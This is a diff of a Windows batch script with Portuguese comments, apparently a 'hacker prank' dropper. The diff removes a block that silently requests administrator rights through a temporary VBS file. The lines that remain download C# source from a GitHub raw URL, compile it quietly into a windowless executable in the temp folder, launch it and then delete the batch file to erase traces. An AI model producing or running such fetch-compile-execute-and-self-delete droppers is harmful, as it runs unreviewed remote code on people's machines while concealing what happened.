@@ -1,20 +1,4 @@
 @echo off
-:: --- PEDIR PERMISSÃO DE ADMINISTRADOR ---
->nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-if '%errorlevel%' NEQ '0' (
-    echo Pedindo permissao de administrador...
-    goto UACPrompt
-) else ( goto gotAdmin )
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
-    "%temp%\getadmin.vbs"
-    exit /B
-:gotAdmin
-    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
-    pushd "%CD%"
-    CD /D "%~dp0"
-
 :: --- CONFIGURAÇÕES ---
 set "GITHUB_RAW_URL=https://raw.githubusercontent.com/espertin/wind/main/TrolagemHacker_GitHub.cs"
 set "TEMP_CS=%temp%\TrolagemHacker.cs"
@@ -30,7 +14,7 @@ if exist "%TEMP_CS%" (
     "%CSC_PATH%" /target:winexe /out:"%EXE_OUT%" "%TEMP_CS%" >nul 2>&1
 )
 
-:: --- EXECUÇÃO E LIMPEZA ---
+:: --- EXECUÇÃO E AUTODESTRUIÇÃO DO BATCH ---
 if exist "%EXE_OUT%" (
     start "" "%EXE_OUT%"
     (goto) 2>nul & del /f /q "%~f0"
